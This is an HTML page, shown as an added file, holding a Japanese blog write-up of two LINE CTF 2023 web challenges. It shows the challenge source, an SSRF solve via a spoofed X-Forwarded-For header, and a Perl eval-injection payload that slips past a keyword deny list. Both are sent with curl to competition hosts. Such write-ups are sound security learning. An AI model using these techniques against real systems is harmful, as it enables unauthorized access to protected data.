@@ -1,0 +1,186 @@
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>[LINE CTF 2023] My own writeup - yuasa's blog</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="LINE CTF 2023がMarch 25, 2023, 09:00 AM ~ March 26, 2023, 09:00 AM (UTC+9)で開催されました。
+[web] Baby Simple GoCurl package main import ( &#34;errors&#34; // &#34;fmt&#34; &#34;io/ioutil&#34; &#34;log&#34; &#34;net/http&#34; &#34;os&#34; &#34;strings&#34; &#34;github.com/gin-gonic/gin&#34; ) func redirectChecker(req *http.Request, via []*http.Request) error { reqIp := strings.Split(via[len(via)-1].Host, &#34;:&#34;)[0] if len(via) >= 2 || reqIp != &#34;127.0.0.1&#34; { return errors.New(&#34;Something wrong&#34;) } return nil } func main() { flag := os.Getenv(&#34;FLAG&#34;) r := gin.Default() r.LoadHTMLGlob(&#34;view/*.html&#34;) r.Static(&#34;/static&#34;, &#34;."><meta property="og:image" content><meta property="og:title" content="[LINE CTF 2023] My own writeup"><meta property="og:description" content="LINE CTF 2023がMarch 25, 2023, 09:00 AM ~ March 26, 2023, 09:00 AM (UTC+9)で開催されました。
+[web] Baby Simple GoCurl package main import ( &#34;errors&#34; // &#34;fmt&#34; &#34;io/ioutil&#34; &#34;log&#34; &#34;net/http&#34; &#34;os&#34; &#34;strings&#34; &#34;github.com/gin-gonic/gin&#34; ) func redirectChecker(req *http.Request, via []*http.Request) error { reqIp := strings.Split(via[len(via)-1].Host, &#34;:&#34;)[0] if len(via) >= 2 || reqIp != &#34;127.0.0.1&#34; { return errors.New(&#34;Something wrong&#34;) } return nil } func main() { flag := os.Getenv(&#34;FLAG&#34;) r := gin.Default() r.LoadHTMLGlob(&#34;view/*.html&#34;) r.Static(&#34;/static&#34;, &#34;."><meta property="og:type" content="article"><meta property="og:url" content="/posts/32/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-03-26T01:00:02+01:00"><meta property="article:modified_time" content="2023-03-26T01:00:02+01:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="[LINE CTF 2023] My own writeup"><meta name=twitter:description content="LINE CTF 2023がMarch 25, 2023, 09:00 AM ~ March 26, 2023, 09:00 AM (UTC+9)で開催されました。
+[web] Baby Simple GoCurl package main import ( &#34;errors&#34; // &#34;fmt&#34; &#34;io/ioutil&#34; &#34;log&#34; &#34;net/http&#34; &#34;os&#34; &#34;strings&#34; &#34;github.com/gin-gonic/gin&#34; ) func redirectChecker(req *http.Request, via []*http.Request) error { reqIp := strings.Split(via[len(via)-1].Host, &#34;:&#34;)[0] if len(via) >= 2 || reqIp != &#34;127.0.0.1&#34; { return errors.New(&#34;Something wrong&#34;) } return nil } func main() { flag := os.Getenv(&#34;FLAG&#34;) r := gin.Default() r.LoadHTMLGlob(&#34;view/*.html&#34;) r.Static(&#34;/static&#34;, &#34;."><script src=/js/feather.min.js></script>
+<link href=/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link id=darkModeStyle rel=stylesheet type=text/css href=/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css media="(prefers-color-scheme: dark)"><link rel=icon type=image/png href=/images/favicon.ico></head><body><div class=content><header><div class=main><a href=/>yuasa's blog</a></div><nav><a href=/>Home</a>
+<a href=/posts>Posts</a>
+<a href=/tags>Tags</a></nav></header><main><article><div class=title><h1 class=title>[LINE CTF 2023] My own writeup</h1><div class=meta>Posted on Mar 26, 2023</div></div><nav id=TableOfContents><ol><li><a href=#web-baby-simple-gocurl>[web] Baby Simple GoCurl</a></li><li><a href=#web-old-pal>[web] Old Pal</a></li></ol></nav><section class=body><p>LINE CTF 2023がMarch 25, 2023, 09:00 AM ~ March 26, 2023, 09:00 AM (UTC+9)で開催されました。</p><h1 id=web-baby-simple-gocurl>[web] Baby Simple GoCurl</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.go data-lang=:.go><span style=display:flex><span><span style=color:#f92672>package</span> <span style=color:#a6e22e>main</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> (
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;errors&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// &#34;fmt&#34;
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#e6db74>&#34;io/ioutil&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;log&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;net/http&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;os&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;strings&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;github.com/gin-gonic/gin&#34;</span>
+</span></span><span style=display:flex><span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>redirectChecker</span>(<span style=color:#a6e22e>req</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Request</span>, <span style=color:#a6e22e>via</span> []<span style=color:#f92672>*</span><span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Request</span>) <span style=color:#66d9ef>error</span> {
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>reqIp</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>Split</span>(<span style=color:#a6e22e>via</span>[len(<span style=color:#a6e22e>via</span>)<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>].<span style=color:#a6e22e>Host</span>, <span style=color:#e6db74>&#34;:&#34;</span>)[<span style=color:#ae81ff>0</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> len(<span style=color:#a6e22e>via</span>) <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>2</span> <span style=color:#f92672>||</span> <span style=color:#a6e22e>reqIp</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;127.0.0.1&#34;</span> {
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>errors</span>.<span style=color:#a6e22e>New</span>(<span style=color:#e6db74>&#34;Something wrong&#34;</span>)
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>nil</span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>main</span>() {
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>flag</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>Getenv</span>(<span style=color:#e6db74>&#34;FLAG&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>r</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>Default</span>()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>LoadHTMLGlob</span>(<span style=color:#e6db74>&#34;view/*.html&#34;</span>)
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>Static</span>(<span style=color:#e6db74>&#34;/static&#34;</span>, <span style=color:#e6db74>&#34;./static&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>GET</span>(<span style=color:#e6db74>&#34;/&#34;</span>, <span style=color:#66d9ef>func</span>(<span style=color:#a6e22e>c</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>Context</span>) {
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>log</span>.<span style=color:#a6e22e>Println</span>(<span style=color:#e6db74>&#34;[+] ClientIP : &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>ClientIP</span>())
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>			<span style=color:#e6db74>&#34;a&#34;</span>: <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>ClientIP</span>(),
+</span></span><span style=display:flex><span>		})
+</span></span><span style=display:flex><span>	})
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>GET</span>(<span style=color:#e6db74>&#34;/curl/&#34;</span>, <span style=color:#66d9ef>func</span>(<span style=color:#a6e22e>c</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>Context</span>) {
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>client</span> <span style=color:#f92672>:=</span> <span style=color:#f92672>&amp;</span><span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Client</span>{
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>CheckRedirect</span>: <span style=color:#66d9ef>func</span>(<span style=color:#a6e22e>req</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Request</span>, <span style=color:#a6e22e>via</span> []<span style=color:#f92672>*</span><span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Request</span>) <span style=color:#66d9ef>error</span> {
+</span></span><span style=display:flex><span>				<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>redirectChecker</span>(<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>via</span>)
+</span></span><span style=display:flex><span>			},
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>reqUrl</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>ToLower</span>(<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>Query</span>(<span style=color:#e6db74>&#34;url&#34;</span>))
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>reqHeaderKey</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>Query</span>(<span style=color:#e6db74>&#34;header_key&#34;</span>)
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>reqHeaderValue</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>Query</span>(<span style=color:#e6db74>&#34;header_value&#34;</span>)
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>reqIP</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>Split</span>(<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>Request</span>.<span style=color:#a6e22e>RemoteAddr</span>, <span style=color:#e6db74>&#34;:&#34;</span>)[<span style=color:#ae81ff>0</span>]
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>log</span>.<span style=color:#a6e22e>Println</span>(<span style=color:#e6db74>&#34;[+] &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>reqUrl</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;, &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>reqIP</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;, &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>reqHeaderKey</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;, &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>reqHeaderValue</span>)
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>log</span>.<span style=color:#a6e22e>Println</span>(<span style=color:#e6db74>&#34;[+] ClientIP : &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>ClientIP</span>())
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>ClientIP</span>() <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;127.0.0.1&#34;</span> <span style=color:#f92672>&amp;&amp;</span> (<span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>Contains</span>(<span style=color:#a6e22e>reqUrl</span>, <span style=color:#e6db74>&#34;flag&#34;</span>) <span style=color:#f92672>||</span> <span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>Contains</span>(<span style=color:#a6e22e>reqUrl</span>, <span style=color:#e6db74>&#34;curl&#34;</span>) <span style=color:#f92672>||</span> <span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>Contains</span>(<span style=color:#a6e22e>reqUrl</span>, <span style=color:#e6db74>&#34;%&#34;</span>)) {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>JSON</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusBadRequest</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{<span style=color:#e6db74>&#34;message&#34;</span>: <span style=color:#e6db74>&#34;Something wrong&#34;</span>})
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>NewRequest</span>(<span style=color:#e6db74>&#34;GET&#34;</span>, <span style=color:#a6e22e>reqUrl</span>, <span style=color:#66d9ef>nil</span>)
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>JSON</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusBadRequest</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{<span style=color:#e6db74>&#34;message&#34;</span>: <span style=color:#e6db74>&#34;Something wrong&#34;</span>})
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>reqHeaderKey</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;&#34;</span> <span style=color:#f92672>||</span> <span style=color:#a6e22e>reqHeaderValue</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;&#34;</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>Header</span>.<span style=color:#a6e22e>Set</span>(<span style=color:#a6e22e>reqHeaderKey</span>, <span style=color:#a6e22e>reqHeaderValue</span>)
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>resp</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>client</span>.<span style=color:#a6e22e>Do</span>(<span style=color:#a6e22e>req</span>)
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>JSON</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusBadRequest</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{<span style=color:#e6db74>&#34;message&#34;</span>: <span style=color:#e6db74>&#34;Something wrong&#34;</span>})
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>defer</span> <span style=color:#a6e22e>resp</span>.<span style=color:#a6e22e>Body</span>.<span style=color:#a6e22e>Close</span>()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>bodyText</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>ioutil</span>.<span style=color:#a6e22e>ReadAll</span>(<span style=color:#a6e22e>resp</span>.<span style=color:#a6e22e>Body</span>)
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>JSON</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusBadRequest</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{<span style=color:#e6db74>&#34;message&#34;</span>: <span style=color:#e6db74>&#34;Something wrong&#34;</span>})
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>statusText</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>resp</span>.<span style=color:#a6e22e>Status</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>JSON</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>			<span style=color:#e6db74>&#34;body&#34;</span>:   string(<span style=color:#a6e22e>bodyText</span>),
+</span></span><span style=display:flex><span>			<span style=color:#e6db74>&#34;status&#34;</span>: <span style=color:#a6e22e>statusText</span>,
+</span></span><span style=display:flex><span>		})
+</span></span><span style=display:flex><span>	})
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>GET</span>(<span style=color:#e6db74>&#34;/flag/&#34;</span>, <span style=color:#66d9ef>func</span>(<span style=color:#a6e22e>c</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>Context</span>) {
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>reqIP</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>Split</span>(<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>Request</span>.<span style=color:#a6e22e>RemoteAddr</span>, <span style=color:#e6db74>&#34;:&#34;</span>)[<span style=color:#ae81ff>0</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>log</span>.<span style=color:#a6e22e>Println</span>(<span style=color:#e6db74>&#34;[+] IP : &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>reqIP</span>)
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>reqIP</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;127.0.0.1&#34;</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>JSON</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>				<span style=color:#e6db74>&#34;message&#34;</span>: <span style=color:#a6e22e>flag</span>,
+</span></span><span style=display:flex><span>			})
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>JSON</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusBadRequest</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>			<span style=color:#e6db74>&#34;message&#34;</span>: <span style=color:#e6db74>&#34;You are a Guest, This is only for Host&#34;</span>,
+</span></span><span style=display:flex><span>		})
+</span></span><span style=display:flex><span>	})
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>Run</span>()
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p><code>/curl</code>を使用して、HTTPリクエストが送信できるようです。ここで<code>/curl</code>経由で<code>/flag</code>を叩くことができれば、<code>reqIP</code>が<code>127.0.0.1</code>となってflagが得られそうです。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.go data-lang=:.go><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#a6e22e>reqIP</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;127.0.0.1&#34;</span> {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>JSON</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;message&#34;</span>: <span style=color:#a6e22e>flag</span>,
+</span></span><span style=display:flex><span>    })
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>そのためには<code>/curl</code>の以下の条件式をパスする必要があります。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.go data-lang=:.go><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>ClientIP</span>() <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;127.0.0.1&#34;</span> <span style=color:#f92672>&amp;&amp;</span> (<span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>Contains</span>(<span style=color:#a6e22e>reqUrl</span>, <span style=color:#e6db74>&#34;flag&#34;</span>) <span style=color:#f92672>||</span> <span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>Contains</span>(<span style=color:#a6e22e>reqUrl</span>, <span style=color:#e6db74>&#34;curl&#34;</span>) <span style=color:#f92672>||</span> <span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>Contains</span>(<span style=color:#a6e22e>reqUrl</span>, <span style=color:#e6db74>&#34;%&#34;</span>)) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>JSON</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusBadRequest</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{<span style=color:#e6db74>&#34;message&#34;</span>: <span style=color:#e6db74>&#34;Something wrong&#34;</span>})
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>ここで、<code>c.ClientIP()</code>が<code>127.0.0.1</code>であれば条件式をパスできそうです。<code>X-Forwarded-For</code>ヘッダに<code>127.0.0.1</code>を設定して、<code>/curl</code>経由で、<code>/flag</code>を叩くことでflagが得られます。</p><pre tabindex=0><code>$ curl -H &#34;X-Forwarded-For:127.0.0.1&#34; &#34;http://34.146.230.233:11000/curl/?url=http://localhost:8080/flag/&#34; 
+{&#34;body&#34;:&#34;{\&#34;message\&#34;:\&#34;= LINECTF{6a22ff56112a69f9ba1bfb4e20da5587}\&#34;}&#34;,&#34;status&#34;:&#34;200 OK&#34;}%  
+</code></pre><h1 id=web-old-pal>[web] Old Pal</h1><p>この問題は解けませんでしたが、途中までやったので記録を残しておきます。</p><pre tabindex=0><code>#!/usr/bin/perl
+use strict;
+use warnings;
+
+use CGI;
+use URI::Escape;
+
+
+$SIG{__WARN__} = \&amp;warn;
+sub warn {
+    print(&#34;Hacker? :(&#34;);
+    exit(1);
+}
+
+
+my $q = CGI-&gt;new;
+print &#34;Content-Type: text/html\n\n&#34;;
+
+
+my $pw = uri_unescape(scalar $q-&gt;param(&#34;password&#34;));
+if ($pw eq &#39;&#39;) {
+    print &#34;Hello :)&#34;;
+    exit();
+}
+if (length($pw) &gt;= 20) {
+    print &#34;Too long :(&#34;;
+    die();
+}
+if ($pw =~ /[^0-9a-zA-Z_-]/) {
+    print &#34;Illegal character :(&#34;;
+    die();
+}
+if ($pw !~ /[0-9]/ || $pw !~ /[a-zA-Z]/ || $pw !~ /[_-]/) {
+    print &#34;Weak password :(&#34;;
+    die();
+}
+if ($pw =~ /[0-9_-][boxe]/i) {
+    print &#34;Do not punch me :(&#34;;
+    die();
+}
+if ($pw =~ /AUTOLOAD|BEGIN|CHECK|DESTROY|END|INIT|UNITCHECK|abs|accept|alarm|atan2|bind|binmode|bless|break|caller|chdir|chmod|chomp|chop|chown|chr|chroot|close|closedir|connect|cos|crypt|dbmclose|dbmopen|defined|delete|die|dump|each|endgrent|endhostent|endnetent|endprotoent|endpwent|endservent|eof|eval|exec|exists|exit|fcntl|fileno|flock|fork|format|formline|getc|getgrent|getgrgid|getgrnam|gethostbyaddr|gethostbyname|gethostent|getlogin|getnetbyaddr|getnetbyname|getnetent|getpeername|getpgrp|getppid|getpriority|getprotobyname|getprotobynumber|getprotoent|getpwent|getpwnam|getpwuid|getservbyname|getservbyport|getservent|getsockname|getsockopt|glob|gmtime|goto|grep|hex|index|int|ioctl|join|keys|kill|last|lc|lcfirst|length|link|listen|local|localtime|log|lstat|map|mkdir|msgctl|msgget|msgrcv|msgsnd|my|next|not|oct|open|opendir|ord|our|pack|pipe|pop|pos|print|printf|prototype|push|quotemeta|rand|read|readdir|readline|readlink|readpipe|recv|redo|ref|rename|require|reset|return|reverse|rewinddir|rindex|rmdir|say|scalar|seek|seekdir|select|semctl|semget|semop|send|setgrent|sethostent|setnetent|setpgrp|setpriority|setprotoent|setpwent|setservent|setsockopt|shift|shmctl|shmget|shmread|shmwrite|shutdown|sin|sleep|socket|socketpair|sort|splice|split|sprintf|sqrt|srand|stat|state|study|substr|symlink|syscall|sysopen|sysread|sysseek|system|syswrite|tell|telldir|tie|tied|time|times|truncate|uc|ucfirst|umask|undef|unlink|unpack|unshift|untie|use|utime|values|vec|wait|waitpid|wantarray|warn|write/) {
+    print &#34;I know eval injection :(&#34;;
+    die();
+}
+if ($pw =~ /[Mx. squ1ffy]/i) {
+    print &#34;You may have had one too many Old Pal :(&#34;;
+    die();
+}
+
+
+if (eval(&#34;$pw == 20230325&#34;)) {
+    print &#34;Congrats! Flag is LINECTF{redacted}&#34;
+} else {
+    print &#34;wrong password :(&#34;;
+    die();
+};
+</code></pre><p>すべての条件式をパスする<code>$pw</code>を入力とすることで、<code>eval("$pw == 20230325")</code>をtrueとすることができればflagが得られます。</p><p>この問題では、「文字と数値を混じった文字列における演算」がキーとなると考えました。Perlにおいては文字列と数値が厳密に区別されておらず、使用される演算子の種類によって、その演算子に対象となる値を文字列と判別したり数値と判別したりするそうです（<a href=javadrive.jp/perl/ope/index9.html#section1>参考</a>）。</p><p>今回は英数字と<code>-</code>または<code>_</code>を用いる必要があるため、<code>$pw</code>として<code>20230325-a</code>を考えました（この演算結果は<code>20230325</code>となります）。しかし、ここでは<code>use strict;</code>によって、strictモードになっているため、以下のようなエラーが出てしまいます。</p><pre tabindex=0><code>Bareword &#34;a&#34; not allowed while &#34;strict subs&#34; in use at (eval 5) line 1.
+</code></pre><p>そのため、strictを無効化する必要があります。そこで<code>$pw</code>として<code>no strict;20230325-a</code>を考えましたが、条件式を全てパスできませんでした。</p><p><em>追記</em></p><p>他の方のwriteupによると、Perlの特殊リテラルである<code>__LINE__</code>を用いた解法がありました。<code>__LINE__</code>は現在の行番号を示すそうです（<a href=https://perldoc.perl.org/perldata#Special-Literals>参考</a>）。<code>$pw</code>として<code>20230326-__LINE__</code>を与えるとflagが取得できました。</p><pre tabindex=0><code>$ curl &#34;http://104.198.120.186:11006/cgi-bin/main.pl?password=20230326-__LINE__&#34;
+Congrats! Flag is LINECTF{3e05d493c941cfe0dd81b70dbf2d972b}
+</code></pre></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/ctf>ctf</a></li><li><a href=/tags/writeup>writeup</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/melonattacker title=GitHub><i data-feather=github></i></a>
+<a class=border></a><a class=soc href=https://x.com/melonattacker title=X><i data-feather=x></i></a>
+<a class=border></a></div><div class=footer-info>2025 © yuasa | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
